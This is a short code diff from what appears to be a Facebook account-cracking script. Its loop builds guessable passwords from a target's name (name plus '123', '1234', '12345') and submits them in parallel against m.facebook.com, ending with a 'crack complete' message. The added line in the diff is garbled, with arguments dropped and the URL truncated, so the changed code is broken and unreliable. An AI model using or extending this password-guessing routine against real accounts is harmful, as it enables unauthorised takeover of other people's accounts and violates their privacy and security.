@@ -397,7 +397,7 @@ def method():
             pwx = [ name+"123", name+"1234", name+"12345" ]
           else:
             pwx = [ name+"123", name+"1234", name+"12345" ]
-          coeg.submit(crack, uid, pwx, "https://m.facebook.com")
+          coeg.submit(crack,s://m.facebook.com")
       exit("\n\n [#] crack complete...")
     else:
       exit("\n [!] correct content")
